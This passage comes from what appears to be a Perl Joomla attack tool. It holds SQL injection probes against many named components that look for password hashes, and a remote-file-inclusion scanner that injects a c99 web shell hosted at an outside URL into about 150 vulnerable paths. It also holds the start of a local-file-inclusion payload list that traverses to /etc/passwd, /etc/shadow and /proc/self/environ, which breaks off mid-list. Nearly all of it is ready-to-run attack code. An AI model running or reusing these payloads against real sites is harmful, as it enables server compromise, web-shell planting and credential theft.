$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_yelps) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_yelp&controller=showdetail&task=showdetail&cid=-999 .$com_yelp.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_yelps) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_dms&task=view_category&category_id=-999 .$com_dms.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_dms) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/administrator/index.php?option=com_jbpublishdownfp&task=edit&cid[]=-999 .$com_jbpublishdownfp.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_jbpublishdownfp) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/5.0 (compatible; MSIE 7.0; Windows)');
$host = $target . "/administrator/index.php?option=com_casino&task=category&id=-999 .$com_casino.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_casino) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_doqment&cid=-999 .$com_doqment.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_doqment) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_alfresco&task=edit&id_pan=999 .$com_alfresco.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_alfresco) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_countries&locat=999 .$com_countries.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_countries) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
}
if($c eq '4')
{
system('cls');
system('title JOomla Rfi Scanner');
@RFI = ("/components/com_flyspray/startdown.php?file=",
"/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=",
"/components/com_simpleboard/file_upload.php?sbp=",
"/components/com_hashcash/server.php?mosConfig_absolute_path=",
"/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=",
"/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=",
"/components/com_performs/performs.php?mosConfig_absolute_path=",
"/components/com_forum/download.php?phpbb_root_path=",
"/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=",
"/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=",
"/components/minibb/index.php?absolute_path=",
"/components/com_smf/smf.php?mosConfig_absolute_path=",
"/modules/mod_calendar.php?absolute_path=",
"/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=",
"/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=",
"/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=",
"/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=",
"/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=",
"/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=",
"/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=",
"/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=",
"/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=",
"/components/com_securityimages/configinsert.php?mosConfig_absolute_path=",
"/components/com_securityimages/lang.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/components/com_galleria/galleria.html.php?mosConfig_absolute_path=",
"/akocomments.php?mosConfig_absolute_path=",
"/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=",
"/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=",
"/components/com_zoom/includes/database.php?mosConfig_absolute_path=",
"/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=",
"/components/com_fm/fm.install.php?lm_absolute_path=",
"/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=",
"/components/com_lmo/lmo.php?mosConfig_absolute_path=",
"/administrator/components/com_webring/admin.webring.docs.php?component_dir=",
"/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=",
"/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=",
"/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=",
"/components/com_mambowiki/MamboLogin.php?IP=",
"/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=",
"/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=",
"/components/com_cpg/cpg.php?mosConfig_absolute_path=",
"/components/com_moodle/moodle.php?mosConfig_absolute_path=",
"/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=",
"/components/com_mospray/scripts/admin.php?basedir=",
"/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=",
"/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=",
"/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=",
"/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=",
"/components/com_madeira/img.php?url=",
"/components/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=",
"/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=",
"/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=",
"/index.php?option=com_custompages&cpage=",
"/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/components/com_facileforms/facileforms.frame.php?ff_compath=",
"/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=",
"/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=",
"/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=",
"/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=",
"/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=",
"/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=",
"/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=",
"/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=",
"/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=",
"/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=",
"/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_joomlaboard/file_upload.php?sbp=",
"/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=",
"/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=",
"/modules/mod_as_category.php?mosConfig_absolute_path=",
"/components/com_articles.php?absolute_path=",
"/classes/html/com_articles.php?absolute_path=",
"/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=",
"/templates/be2004-2/index.php?mosConfig_absolute_path=",
"/libraries/pcl/pcltar.php?g_pcltar_lib_dir=",
"/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=",
"/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=",
"/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=",
"/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=",
"/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=",
"/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=",
"/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=",
"/components/com_mp3_allopass/allopass.php?mosConfig_live_site=",
"/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=",
"/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_color/admin.color.php?mosConfig_live_site=",
"/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=",
"/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=",
"/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=",
"/index.php?option=com_adsmanager&mosConfig_absolute_path=",
"/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=",
"/com_magazine_3_0_1/magazine.functions.php?config=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=",
"/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
 
print "Please Enter Target [http://www.site.com]";
print "\n\n Target:";
$Target=<STDIN>;
chomp ($Target);
print"\n\n \t\t Please wait";
sleep(2);
print"\n";
 
foreach $RFI(@RFI){
my $URL =$Target.$RFI."http://www.sh3ll.org/c99.txt";
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ($Source =~ /c99shell/ || /safe_mode/ || /Executed / || /Shell/){ $Message ="RFI Vulnerability FOUND";}
else { $Message = "NOT FOUND RFI Vulnerability";}
print "\n \n \n \n \t \t \t \t FINISH ";
print "\n $URL  =>   $Message \n";
open (TEXT, '>>RFI.txt');
print TEXT "\n $URL   =>   $Message \n\n";
close (TEXT);
print 'result in RFI.txt';
 
}
 
 
}
if($c eq '3')
{
system('cls');
system('title Joomla LFI Scanner');
@LFI =("/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F.